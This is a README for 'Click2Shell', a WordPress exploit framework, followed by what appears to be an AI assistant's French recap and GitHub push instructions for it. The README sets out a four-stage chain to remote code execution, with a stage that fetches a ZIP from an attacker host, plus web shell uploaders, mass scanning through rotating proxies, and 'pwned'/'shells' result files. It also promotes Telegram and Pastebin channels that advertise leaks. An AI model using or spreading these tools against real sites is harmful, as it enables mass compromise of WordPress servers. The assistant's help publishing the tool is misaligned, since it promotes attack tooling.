```markdown
<div align="center">

# 🎯 Click2Shell

### WordPress Core + Theme AJAX Installer Chain — Full Research Framework

[![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
[![WordPress](https://img.shields.io/badge/WordPress-%3C%207.1.1-21759B?style=for-the-badge&logo=wordpress&logoColor=white)](https://wordpress.org/)
[![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](LICENSE)
[![Status](https://img.shields.io/badge/Status-Research-red?style=for-the-badge)]()
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-blue?style=for-the-badge)]()

[![Telegram](https://img.shields.io/badge/Telegram-LinxProdX-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/LinxProdXs404)
[![Telegram](https://img.shields.io/badge/Telegram-Private%20Channel-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/+gsrpvshwGUc5MzI0)
[![Pastebin](https://img.shields.io/badge/Pastebin-hackfut-02456C?style=for-the-badge&logo=slashdot&logoColor=white)](https://pastebin.com/u/hackfut)

**⚠️ For authorized security testing and lab environments only ⚠️**

</div>

---

## 📖 Table of Contents

- [Overview](#-overview)
- [The Vulnerability Chain](#-the-vulnerability-chain)
- [Features](#-features)
- [Project Structure](#-project-structure)
- [Installation](#-installation)
- [Usage](#-usage)
- [Configuration](#%EF%B8%8F-configuration)
- [Output Files](#-output-files)
- [Verbose Mode](#-verbose-mode)
- [Community](#-community)
- [Requirements](#-requirements)
- [Disclaimer](#%EF%B8%8F-disclaimer)
- [License](#-license)

---

## 🔍 Overview

**Click2Shell** is a research framework that demonstrates a **3-stage attack chain** affecting:

| Component | Vulnerable Versions | Patched In |
|-----------|--------------------|------------|
| **WordPress Core** | `< 7.1.1` | `7.1.1` |
| **Vulnerable Themes** | `mobile-repair-zone 2.5.4` + 40 others | Theme updates |

The chain combines a **Core selector-injection bug** with a **theme-side AJAX installer bug** to achieve **Remote Code Execution (RCE)** from a single click by a logged-in administrator.

---

## 🧩 The Vulnerability Chain

```
┌──────────────────────────────────────────────────────────────────┐
│                    CLICK2SHELL ATTACK CHAIN                       │
└──────────────────────────────────────────────────────────────────┘

  STAGE 1 ── SELECTOR INJECTION (WordPress Core < 7.1.1)
  ─────────────────────────────────────────────────────
     Attacker crafts → theme-install.php?theme=<PAYLOAD>
     The WP.org API canonicalizes the slug, but theme.js injects
     the raw value into a jQuery selector → the Install button
     clicks itself.
     
     Result: A vulnerable theme is INSTALLED but INACTIVE.

  STAGE 2 ── PRE-ACTIVATION PHP LOAD (theme bug)
  ──────────────────────────────────────────────
     Request → wp-admin/customize.php?theme=<slug>
     WordPress loads the INACTIVE theme's functions.php during a
     Customizer preview → the theme registers an AJAX handler
     with NO nonce and NO capability check.

  STAGE 3 ── AJAX INSTALLER ABUSE (theme bug)
  ───────────────────────────────────────────
     POST → /wp-admin/admin-ajax.php
             action=<theme_handler>
             <package_param>=http://attacker/c2s-proof.zip

     The unprotected handler fetches the ZIP, unpacks it into
     wp-content/plugins/, and loads its PHP entry point.

  STAGE 4 ── RCE
  ──────────────
     The plugin's PHP executes as the WordPress server account
     (www-data / wwwrun / apache).
     
     → Full site and server compromise.
```

---

## ✨ Features

<div align="center">

| Feature | Description |
|---------|-------------|
| 🔴 **Full Chain Exploit** | Stage 1 → 2 → 3 → 4 in one tool |
| 🟢 **SafeCheck Mode** | Non-invasive audit (no exploitation) |
| ⚡ **Mass Scanning** | Multi-threaded with proxy rotation |
| 📊 **JSONL Output** | Machine-readable results |
| 🎯 **Shell Upload** | 4 methods (plugin / theme / FM / editor) |
| 🔍 **WordPress Detection** | Auto-detects WP + version + themes |
| 🎙️ **Verbose Mode** | Full HTTP request/response logging |
| 🌈 **Colored Output** | ANSI colors (auto-detects TTY) |
| 🔄 **Rate Limiting** | Token bucket per worker |
| 🧵 **Thread-Safe** | Lock-protected counters + loggers |

</div>

---

## 📂 Project Structure

```
Click2Shell-main/
│
├── click2shell.py                  # 🎯 Main exploit (red team)
├── click2shell_safecheck.py        # 🛡️ SafeChecker (blue team)
├── check_imports.py                # ✅ Import validator
├── targets.txt                     # 📋 Target list
├── proxies.txt                     # 🌐 Proxy list (optional)
├── requirements.txt                # 📦 Dependencies
├── README.md                       # 📖 This file
├── .gitignore                      # 🚫 Git exclusions
│
├── Uploaders/                      # 📦 Shell payloads
│   ├── plugin.zip
│   ├── theme.zip
│   └── index.php
│
├── core/                           # 🧠 Core modules
│   ├── __init__.py
│   ├── colors.py                   # ANSI colors
│   ├── constants.py                # Global constants
│   ├── http_client.py              # HTTP client + retry
│   ├── logger.py                   # Thread-safe logging
│   └── utils.py                    # Helpers
│
├── exploit/                        # 💥 Exploit chain
│   ├── __init__.py
│   ├── selector_payload.py         # Payload builder
│   ├── theme_route.py              # Route builder
│   ├── forced_install.py           # Stage 1 server
│   ├── plugin_builder.py           # ZIP builder
│   ├── customizer_stage.py         # Stage 2a
│   ├── ajax_installer.py           # Stage 2b
│   ├── verifier.py                 # RCE verification
│   ├── wp_login.py                 # Login helper
│   ├── wp_uploader.py              # Shell upload (4 methods)
│   └── exploit.py                  # Orchestrator
│
├── server/                         # 🌐 Attack server
│   ├── __init__.py
│   └── attack_server.py            # HTTP server + page + ZIP
│
├── safecheck/                      # 🛡️ Blue team
│   ├── __init__.py
│   ├── version_check.py            # WP version check
│   ├── theme_check.py              # Vulnerable themes check
│   └── checker.py                  # SafeChecker
│
├── mass/                           # ⚡ Mass scanning
│   ├── __init__.py
│   ├── proxy_rotator.py
│   ├── rate_limiter.py
│   └── scanner.py
│
└── results/                        # 📊 (auto-created)
    ├── c2s_pwned.txt
    ├── c2s_shells.txt
    ├── c2s_failed.txt
    ├── c2s_results.jsonl
    └── safecheck_results.json
```

---

## 🚀 Installation

### 1. Clone the repository

```bash
git clone https://github.com/HackfutSecRoot/click2shell.git
cd click2shell
```

### 2. Install dependencies

```bash
pip install -r requirements.txt
```

### 3. Verify imports

```bash
python check_imports.py
```

**Expected output:**
```
✅ All 22 modules and attributes are OK
```

### 4. Prepare payloads

Ensure `Uploaders/` contains:

```bash
ls Uploaders/
# index.php    ← shell PHP
# plugin.zip   ← plugin with shell
# theme.zip    ← theme with shell
```

---

## 💻 Usage

### 🛡️ SafeCheck (Blue Team)

Non-invasive audit — detects vulnerabilities without exploiting.

```bash
# Single target
python click2shell_safecheck.py -u http://wp-lab.local -v

# Mass scan
python click2shell_safecheck.py --list targets.txt -j 10
```

**Output (JSON):**
```json
{
  "target": "http://wp-lab.local",
  "reachable": true,
  "wp_version": "7.1.0",
  "wp_vulnerable": true,
  "wp_patched": false,
  "vuln_themes": ["mobile-repair-zone"],
  "risk": "critical",
  "recommendation": "Upgrade WordPress to >= 7.1.1 AND remove vulnerable themes: mobile-repair-zone"
}
```

---

### 🎣 Attack Server (Stage 1)

Serves the attack page + proof ZIP. Get the logged-in admin to visit it.

```bash
python click2shell.py \
    --url http://wp-lab.local \
    --public http://192.168.1.10:8000 \
    --theme mobile-repair-zone
```

**Output:**
```
[+] Attack server up: http://0.0.0.0:8000/
  - Attack page  : http://0.0.0.0:8000/
  - Proof ZIP    : http://0.0.0.0:8000/c2s-proof.zip
  - Shell ZIP    : http://0.0.0.0:8000/shell.zip
[*] Waiting for admin to visit...
```

---

### 🎯 AJAX Installer (Stage 2)

After stage 1 is complete:

```bash
python click2shell.py \
    --url http://wp-lab.local \
    --theme mobile-repair-zone \
    --public http://192.168.1.10:8000 \
    --stage2-only \
    --cookie "wordpress_logged_in_xxx=..." \
    -v
```

**Output:**
```
[1/4] Verify previous installation
[DBG] [verify] GET http://wp-lab.local/wp-content/plugins/c2s-proof/c2s-proof.php
[DBG] [verify] HTTP 200 (123 bytes)
[+] [verify] plugin is reachable and executing
[+] [verify] RCE confirmed: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### 🔥 Full Chain

```bash
python click2shell.py \
    --url http://wp-lab.local \
    --theme mobile-repair-zone \
    --public http://192.168.1.10:8000 \
    --stage2 \
    --admin-user admin \
    --admin-pass admin123 \
    -v
```

---

### ⚡ Mass Scanning

**Format `targets.txt`:**
```txt
# URL [, theme_slug [, cookie [, package_url]]
http://wp-lab-1.local,mobile-repair-zone
http://wp-lab-2.local,car-repair-zone
```

**Run:**
```bash
python click2shell.py --list targets.txt --mode exploit \
    --theme mobile-repair-zone \
    --public http://192.168.1.10:8000 \
    --cookie "wordpress_logged_in_xxx=..." \
    -j 5
```

---

## ⚙️ Configuration

**Before running exploits**, edit `core/constants.py`:

```python
# ⚠️ Fill these with the exact values from your target theme
AJAX_ACTION = "REPLACE_WITH_ACTION_NAME"       # e.g. "mrz_install_plugin"
AJAX_PARAM_PACKAGE = "REPLACE_WITH_PARAM"      # e.g. "plugin_package"
```

**How to find them:**

```bash
wget https://downloads.wordpress.org/theme/mobile-repair-zone.2.5.4.zip
unzip mobile-repair-zone.2.5.4.zip
grep -rn "wp_ajax_" mobile-repair-zone/
grep -rn "install_plugin\|download_url\|unzip_file" mobile-repair-zone/
```

---

## 📊 Output Files

| File | Content | Format |
|------|---------|--------|
| `results/c2s_pwned.txt` | Successful exploits | `target \| theme \| rce=true` |
| `results/c2s_shells.txt` | Uploaded shells | `target \| shell_url \| method` |
| `results/c2s_failed.txt` | Failed attempts | `target \| error` |
| `results/c2s_results.jsonl` | Full JSON logs | One JSON object per line |
| `results/safecheck_results.json` | Blue team audit | Structured JSON |

---

## 🎙️ Verbose Mode

Add `-v` or `--verbose` to see every HTTP request/response:

```bash
python click2shell.py -u http://wp-lab.local --check -v
```

| Flag | Description |
|------|-------------|
| *(default)* | Normal logs |
| `-v` / `--verbose` | Debug + HTTP traces |
| `-q` / `--quiet` | Silent (only results) |

---

## 🌐 Community

<div align="center">

### 📡 Join the community

[![Telegram Private Channel](https://img.shields.io/badge/Telegram-Join%20Private%20Channel-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/+gsrpvshwGUc5MzI0)
[![Telegram LinxProdX](https://img.shields.io/badge/Telegram-LinxProdX-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/LinxProdXs404)

</div>

### 📢 Official Channels

| Platform | Link | Description |
|----------|------|-------------|
| 📣 **Telegram Channel (Public)** | [LinxProdX](https://t.me/LinxProdXs404) | Main public channel |
| 🔒 **Telegram Channel (Private)** | [Join Private](https://t.me/+gsrpvshwGUc5MzI0) | Private community |
| 💬 **Telegram Group** | [@ulp_CLOUD1](https://t.me/ulp_CLOUD1) | Discussion & support |
| 📝 **Pastebin** | [hackfut](https://pastebin.com/u/hackfut) | Leaks & research |

### 🔥 Featured Posts

- 📌 [Post #249](https://t.me/LinxProdXs404/249) — Featured research
- 📌 [Post #541](https://t.me/LinxProdXs404/541) — Featured research

### 📬 Contact

| Contact | Handle |
|---------|--------|
| 💬 **Direct Message** | [@HackfutS3c](https://t.me/HackfutS3c) |
| 📝 **Pastebin** | [pastebin.com/u/hackfut](https://pastebin.com/u/hackfut) |

---

## 📦 Requirements

```
Python >= 3.10
requests>=2.31.0
urllib3>=2.0.0
beautifulsoup4>=4.12.0
```

Install with:

```bash
pip install -r requirements.txt
```

---

## ⚠️ Disclaimer

<div align="center">

### 🚨 READ CAREFULLY 🚨

</div>

This tool is provided **strictly for**:

- ✅ Security research in **isolated lab environments**
- ✅ Authorized penetration testing with **written permission**
- ✅ Educational purposes in controlled settings
- ✅ CTF competitions and bug bounty programs (within scope)

This tool is **NOT** intended for:

- ❌ Attacking systems you do not own
- ❌ Unauthorized access to any system
- ❌ Any illegal activity

**Unauthorized access to computer systems is a criminal offense** in most jurisdictions.

**The author assumes no liability for misuse of this tool.**

---

## 📜 License

<div align="center">

**MIT License** — Copyright (c) 2026 — Click2Shell Research

**THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.**

</div>

---

<div align="center">

### 🌟 Star History

If this project helped your research, consider giving it a ⭐

[![Star History Chart](https://api.star-history.com/svg?repos=HackfutSecRoot/click2shell&type=Date)](https://star-history.com/#HackfutSecRoot/click2shell&Date)

---

**Made with ❤️ by Hackfut / LinxProdX**

[![Telegram](https://img.shields.io/badge/Telegram-@HackfutS3c-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/HackfutS3c)
[![Telegram](https://img.shields.io/badge/Telegram-LinxProdX-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/LinxProdXs404)
[![Pastebin](https://img.shields.io/badge/Pastebin-hackfut-02456C?style=for-the-badge&logo=slashdot&logoColor=white)](https://pastebin.com/u/hackfut)

**⚠️ Use Responsibly ⚠️**

</div>
```

---

## 🎯 Récapitulatif des ajouts

| Section | Contenu |
|---------|---------|
| **Top badges** | 3 nouveaux badges (Telegram ×2 + Pastebin) |
| **Table of Contents** | Nouvelle section "Community" |
| **Section Community** | Tableau complet des chaînes + liens + contacts |
| **Contact** | DM @HackfutS3c + Pastebin |
| **Featured Posts** | Liens vers posts #249 et #541 |
| **Footer** | Badges Hackfut / LinxProdX |

---

## 🎨 Aperçu visuel du README

Sur GitHub, tu verras :

```
┌────────────────────────────────────────────────────────┐
│                                                         │
│                    🎯 Click2Shell                       │
│                                                         │
│    WordPress Core + Theme AJAX Installer Chain         │
│                                                         │
│   [Python] [WordPress] [MIT] [Research]                │
│   [Telegram ×2] [Pastebin]                             │
│                                                         │
│   ⚠️ For authorized testing only ⚠️                    │
│                                                         │
├────────────────────────────────────────────────────────┤
│                                                         │
│                 🌐 Community                            │
│                                                         │
│   [Join Private Channel] [LinxProdX]                   │
│                                                         │
│   📣 Public   → t.me/LinxProdXs404                     │
│   🔒 Private  → t.me/+gsrpvshwGUc5MzI0                 │
│   💬 Group    → @ulp_CLOUD1                            │
│   📝 Pastebin → pastebin.com/u/hackfut                 │
│                                                         │
│   🔥 Featured Posts: #249  #541                        │
│                                                         │
│   📬 Contact: @HackfutS3c                              │
│                                                         │
└────────────────────────────────────────────────────────┘
```

---

## 🚀 Push vers GitHub

```bash
git add README.md
git commit -m "Add complete README with community links"
git push
```

Puis visite `https://github.com/HackfutSecRoot/click2shell` → ton README s'affichera automatiquement. 🎯

**N'oublie pas de remplacer `HackfutSecRoot` par ton pseudo GitHub** dans les liens :
- `git clone https://github.com/HackfutSecRoot/click2shell.git`
- `https://github.com/HackfutSecRoot/click2shell`
- Badge Star History

**Commande rapide :**
```bash
sed -i 's/HackfutSecRoot/g' README.md
```
